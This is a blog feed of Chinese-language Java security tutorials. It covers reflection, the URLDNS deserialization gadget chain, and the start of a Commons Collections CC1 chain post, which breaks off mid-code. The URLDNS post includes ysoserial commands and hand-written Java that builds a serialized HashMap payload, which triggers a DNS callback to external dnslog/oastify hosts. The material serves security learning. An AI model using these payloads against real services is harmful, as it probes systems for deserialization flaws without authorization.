java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Constructor</span> <span class="hljs-variable">personConstructor</span> <span class="hljs-operator">=</span> c.getConstructor(String.class, <span class="hljs-type">int</span>.class);<br></code></pre></td></tr></table></figure><p>然后我们再实例化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Person&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">personConstructor</span> <span class="hljs-operator">=</span> c.getConstructor(String.class, <span class="hljs-type">int</span>.class);<br>    <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Person) personConstructor.newInstance(<span class="hljs-string">&quot;abc&quot;</span>, <span class="hljs-number">22</span>);<br>    System.out.println(p);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="获取类里面属性"><a href="#获取类里面属性" class="headerlink" title="获取类里面属性"></a>获取类里面属性</h2><h3 id="getFields"><a href="#getFields" class="headerlink" title="getFields"></a>getFields</h3><p>它的参数类型是一个数组，我们来打印看一下返回什么</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Field[] personfields = c.getFields();<br><span class="hljs-keyword">for</span> (Field f:personfields)&#123;<br>     System.out.println(f);<br>&#125;<br></code></pre></td></tr></table></figure><p>返回了</p><p>​<code>public java.lang.String Person.name</code>​</p><p>也就是string类型的name，但是要知道我们一开始写的demo里面还有一个age，age并没有打印出来，即这个只可以返回public类型的参数</p><h3 id="getDeclaredFields"><a href="#getDeclaredFields" class="headerlink" title="getDeclaredFields"></a>getDeclaredFields</h3><p>那么我们就用这个看能否把private的age返回，直接进行修改</p><p>​<code>public java.lang.String Person.name private int Person.age</code>​</p><p>ok，成功返回了私有属性的参数</p><p>也就是说Declared会把所有的变量都打印出来</p><h3 id="getField"><a href="#getField" class="headerlink" title="getField"></a>getField</h3><p>我们用这个进行属性值的更改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">namefield</span> <span class="hljs-operator">=</span> c.getField(<span class="hljs-string">&quot;name&quot;</span>);<br>namefield.set(p,<span class="hljs-string">&quot;aaaaaaaaaa&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250804214814-j4avujr.png" alt="image"></p><p>同理，这个也只是可以修改公有属性的值</p><h3 id="getDeclaredField"><a href="#getDeclaredField" class="headerlink" title="getDeclaredField"></a>getDeclaredField</h3><p>如果我们直接把它改成这个运行会报access的问题</p><p>于是我们需要加上一行赋予权限</p><p>​<code>namefield.setAccessible(true);</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250804215438-1jkeeki.png" alt="image"></p><h2 id="调用类里面的方法"><a href="#调用类里面的方法" class="headerlink" title="调用类里面的方法"></a>调用类里面的方法</h2><h3 id="getMethods"><a href="#getMethods" class="headerlink" title="getMethods"></a>getMethods</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Method[] personmethods = c.getMethods();<br><span class="hljs-keyword">for</span> (Method f:personmethods)&#123;<br>    System.out.println(f);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250804220323-p6v65g2.png" alt="image"></p><p>大部分都是继承的方法，但是也可以看到有我定义的action方法</p><h3 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h3><p>接收一个函数名和一个类的泛型</p><p>用这个来调用我们的方法</p><p>跟getField类似，但这里不适用set而是用invoke</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">actionmethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;action&quot;</span>, String.class);<br>actionmethod.invoke(p,<span class="hljs-string">&quot;sdfghhj&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="getDeclaredMethod"><a href="#getDeclaredMethod" class="headerlink" title="getDeclaredMethod"></a>getDeclaredMethod</h3><p>与getDeclaredField一样</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。</strong> </p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA安全之URLDNS链</title>
    <link href="/post/java-secure-urldns-link-z2cryuz.html"/>
    <url>/post/java-secure-urldns-link-z2cryuz.html</url>
    
    <content type="html"><![CDATA[<h1 id="JAVA安全之URLDNS链"><a href="#JAVA安全之URLDNS链" class="headerlink" title="JAVA安全之URLDNS链"></a>JAVA安全之URLDNS链</h1><p>一个对于新手非常友好的链子，不是很复杂</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">*   Gadget Chain:<br>*     HashMap.readObject()<br>*       HashMap.putVal()<br>*         HashMap.hash()<br>*           URL.hashCode()<br></code></pre></td></tr></table></figure><p>利用效果是发起一次远程请求，而不能去执行命令。基本上是用来测试是否存在反序列化漏洞的一个链，比如在一些无法回显执行命令的时候，可以通过URLDNS链去发送一个dns解析请求，如果dnslog收到了请求，就证明了存在漏洞。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h2><p>先简单了解一下概念</p><p>Java提供了一种对象序列化的机制，用一个字节序列表示一个对象，该字节包含对象的数据、对象的类型、对象的存储属性。字节序列写出到文件后，相当于可以持久报错了一个对象信息，这过程叫做序列化。序列化对象会通过<code>ObjectOutputStream</code>​的<code>writeObject</code>​方法将一个对象写入到文件中。</p><p>而反序列化是使用了<code>readObject</code>​ 方法进行读取并还原成在序列化前的一个类。</p><p>这一步骤并没有什么安全问题，但是如果反序列化的数据是可控的情况下，那么我们就可以从某个输入点，输入恶意代码，再去查找在哪个点，我们的输入会被一层一层的带去到我们的触发点去，而这一步叫做寻找利用链的步骤。</p><p>可以反序列化必须满足以下几个条件：</p><p>1.类必须实现 <code>java.io.Serializable</code>​ 接口（最基本）</p><p>2.需要存在一个可利用的类，其readObject()方法或其他方法中存在可被利用的逻辑，例如执行命令、读取文件等</p><p>3.序列化和反序列化的类需要具有相同的serialVersionUID</p><h2 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h2><p>首先来说一下正射<br>我们在编写代码时，当需要使用到某一个类的时候，都会先了解这个类是做什么的。然后实例化这个类，接着用实例化好的对象进行操作，这就是正射。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>student.doHomework(<span class="hljs-string">&quot;数学&quot;</span>）;<br></code></pre></td></tr></table></figure><p>反射<br>反射就是，一开始并不知道我们要初始化的类对象是什么，自然也无法使用new关键字来创建对象了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span>Class.forName(<span class="hljs-string">&quot;reflection.Student&quot;</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span>clazz.getMethod(<span class="hljs-string">&quot;doHomework&quot;</span>，String.class); Constructor constructor=clazz.getConstructor();<br>Object object=constructor.newInstance(); method.invoke(object，“语文<span class="hljs-string">&quot;);</span><br></code></pre></td></tr></table></figure><p>反射的作用：让java具有动态性；修改已有对象的属性；动态生成对象；动态调用方法；操作内部类和私有方法</p><p>在反序列化漏洞中的应用：定制需要的对象；通过invoke调用除了同名函数以外的函数；通过Class类创建对象，引入不能序列化的类</p><p>具体的讲解就不过多赘述了，可以参考一下</p><p><a href="https://www.cnblogs.com/erosion2020/p/18559481">https://www.cnblogs.com/erosion2020/p/18559481</a></p><h1 id="URLDNS链利用"><a href="#URLDNS链利用" class="headerlink" title="URLDNS链利用"></a>URLDNS链利用</h1><p>ysoserial项目地址：<a href="https://github.com/frohoff/ysoserial">ysoserial</a></p><p><em>jdk版本低于9，并且windows自带的防火请实时保护要关闭</em></p><p>拉取项目源码，导入到IDEA中。</p><p>看到pom.xml知道该项目是个maven的项目，点击pom.xml 进行刷新，将缺少的依赖给下载下来</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730154407-85wbetu.png" alt="image"></p><p>拉取完后有红的部分也不会影响正常运行</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730154817-mfncdxf.png" alt="image"></p><p>将生成的序列化payload保存，后面用一个测试demo读取文件数据再给他反序列化一下，观察dnslog请求就可以了。</p><p>这里要用项目生成的.jar文件</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730163715-2ssh66d.png" alt="image"></p><p>​<code>java -jar target\ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS &quot;http://sb9p8h.dnslog.cn&quot;</code>​</p><p>​<code>java -jar target\ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS &quot;http://sb9p8h.dnslog.cn&quot; &gt; D:\test\abc.ser</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730165739-hxrt81f.png" alt="image"></p><p>反序列化测试demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">unserialize</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// 反序列化的类</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>((<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;D:/test/abc.ser&quot;</span>)));<br>        <span class="hljs-comment">// 读出来并反序列化</span><br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730165714-bzr6if2.png" alt="image"></p><p>返回dnslog.cn点击refresh record</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730165901-gc1a4kh.png" alt="image"></p><h1 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h1><p>HashMap结合URL触发DNS检查的思路。在实际过程中可以首先通过这个去判断服务器是否使用了readObject()以及能否执行。之后再用各种gadget去尝试试RCE。<br>HashMap最早出现在JDK1.2中，底层基于散列算法实现。而正是因为在HashMap中，Entry的存放位置是根据Key的Hash值来计算，然后存放到数组中的。所以对于同一个Key，在不同的JVM实现中计算得出的Hash值可能是不同的。因此，HashMap实现了自己的 writeObject和readObject方法。<br>因为是研究反序列化问题，所以我们来看一下它的readObject方法</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731130141-soeedv0.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731130507-9vrg3z1.png" alt="image"></p><p>然后再跟进一下hash函数</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731130651-8dg86vw.png" alt="image"></p><p>这里传入了一个对象，当对象不为空时，调用hashCode</p><p>URL实现了序列化接口</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731132716-hqywy9b.png" alt="image"></p><p>看一眼URL的hashCode是什么逻辑</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731131225-pf0fs73.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731131248-m309bes.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731131326-ie2h9er.png" alt="image"></p><p>这里的hashCode默认为就是-1，所以就会正常往下走，会调用handler的hashCode方法，点进去看一下</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731131629-a9a33vq.png" alt="image"></p><p>这里对传进来的做了一个处理，顾名思义就是根据域名来获取地址也就是域名解析的意思</p><p>也就是说如果我们调用了URL内的hashCode函数，我们就可以得到一个DNS请求</p><p>总结一下这个整体思路：</p><p>hashmap-&gt;readObject-&gt;hash-URL.hashcode-&gt;getHostAddress-&gt;InetAddress.getByName(host);</p><h1 id="亲手构造"><a href="#亲手构造" class="headerlink" title="亲手构造"></a>亲手构造</h1><p>分析完这个链子，我们自己手搓一个</p><p>首先要明确<code>HashMap.readObject()</code>​ 在反序列化时会对键值对进行 <code>put()</code>​ 操作，<code>put()</code>​ 会调用 key 的 <code>hashCode()</code>​，如果 key 是 <code>java.net.URL</code>​，就会触发其 DNS 解析行为，所以我们构造一个 <code>HashMap&lt;URL, String&gt;</code>​，并通过反射让 <code>URL.hashCode()</code>​ 在反序列化时第一次被调用</p><p>先写了一份序列化的demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        HashMap&lt;URL,Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>        hashMap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://jd059pldcd9un4aoffkrsnxldcj37uvj.oastify.com&quot;</span>),<span class="hljs-number">1</span>);<br>        serialize(hashMap);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>按理来说什么也不会发生，但是可以看到，序列化的时候就已经接收到请求了</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731141529-9hw0b5u.png" alt="image"></p><p>反而反序列化收不到了，那这是什么情况呢</p><p> 我们跟到hashmap的put函数里面</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731142154-u8d2mmn.png" alt="image"></p><p>这里为了确保键的唯一，就已经调用hash方法也就调用了hashcode</p><p>序列化调用hashcode之后就已经改变了，已经是url的hashcode，在反序列化的时候就不会执行后面了</p><p>那么该怎么改进才能避免这种情况呢</p><p>第一点，我们在序列化之前不要发起请求</p><p>第二点，我们要put之后把hashcode改回-1</p><p>所以我们要用java的反射来改变已有对象属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        HashMap&lt;URL,Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>        <span class="hljs-comment">//把url的hashcode改为不是-1</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://gyi2um6axaur81vl0c5odkiiy940stgi.oastify.com&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br>        hashcodefield.set(url,<span class="hljs-number">1111</span>);<br>        hashMap.put(url,<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//将hashcode改为-1</span><br>        hashcodefield.set(url,-<span class="hljs-number">1</span>);<br>        serialize(hashMap);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>再执行一下</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731162209-z2wv83b.png" alt="image"></p><p>这个时候序列化就查询不到了</p><p>再反序列化一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.test;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731171737-702jc3u.png" alt="image"></p><p>到这里就已经是成功了</p><p>为了更直接的看，在这里下个断点debug一下</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731202423-ok14olj.png" alt="image"></p><p>反序列化的时候调一下看看</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731202638-ce3cexd.png" alt="image"></p><p>当前这个状态hashcode是-1，代表我们-1赋值成功</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化CC1链</title>
    <link href="/post/cc1-chain-z1gjwa5.html"/>
    <url>/post/cc1-chain-z1gjwa5.html</url>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化CC1链"><a href="#Java反序列化CC1链" class="headerlink" title="Java反序列化CC1链"></a>Java反序列化CC1链</h1><h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p><a href="http://commons.apache.org/">Apache Commons</a>是Apache软件基金会的项目，曾经隶属于<code>Jakarta</code>​项目。<code>Commons</code>​的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：<code>Proper</code>​（是一些已发布的项目）、<code>Sandbox</code>​（是一些正在开发的项目）和<code>Dormant</code>​（是一些刚启动或者已经停止维护的项目）。</p><p><a href="http://commons.apache.org/proper/commons-collections/">Commons Collections</a>包为Java标准的<code>Collections API</code>​提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p><p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/</a></p><p>CC1、CC2，这里指的不是cc库的版本，而是cc库的不同的利用方式，或者叫poc代码的攻击链构造方式，同时cc库版本对最终的利用结果有较大的影响，所以文章中会先给出对应的JDK版本和commons-collections版本，以便于后期调试不会出现差错。</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>jdk版本：8u65</p><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><p><em>这里注意一下，一定要是英文官网，即路径没有cn的，不然版本会下载错误</em></p><p>openJDK</p><p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/file/af660750b2f4/">https://hg.openjdk.org/jdk8u/jdk8u/jdk/file/af660750b2f4/</a></p><p>把下载的openjdk里 src&#x2F;share&#x2F;classes&#x2F; 里面的 sun包 复制到 jdk1.8.0_65的src解压过后的文件夹里</p><p>打开IDEA 新建一个Maven项目 </p><p>将下面写入到 pom.xml 里</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250802162957-nu2s3fd.png" alt="image"></p><p>点开maven文件如果是.class文件，点击Download Source</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250802163623-jkxz88c.png" alt="image"></p><p>下载完成后应该是这样的</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250802163941-azerzkh.png" alt="image"></p><p>然后打开 IDEA 文件-&gt;项目结构-&gt; SDK -&gt; 源路径设置 填上刚才设置的的src目录</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250802163332-j76tx6r.png" alt="image"></p><h1 id="分析链子"><a href="#分析链子" class="headerlink" title="分析链子"></a>分析链子</h1><h2 id="InvokeTransformer"><a href="#InvokeTransformer" class="headerlink" title="InvokeTransformer"></a><strong>InvokeTransformer</strong></h2><p>首先是找到了commons-collections里面的Transformer</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250802174042-wn6kxxh.png" alt="image"></p><p>它的具体作用是接受一个对象，接受进去后调用它的transform方法，就会对对象进行一些操作</p><p>先来看一下（ctrl+alt+B）</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250802175415-gs3evqo.png" alt="image"></p><p>随便点进去一个，比如ConstantTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">  ...<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<br>       <span class="hljs-built_in">super</span>();<br>       iConstant = constantToReturn;<br>   &#125;<br><br>   <span class="hljs-comment">/**</span><br><span class="hljs-comment">    * Transforms the input by ignoring it and returning the stored constant instead.</span><br><span class="hljs-comment">    * </span><br><span class="hljs-comment">    * <span 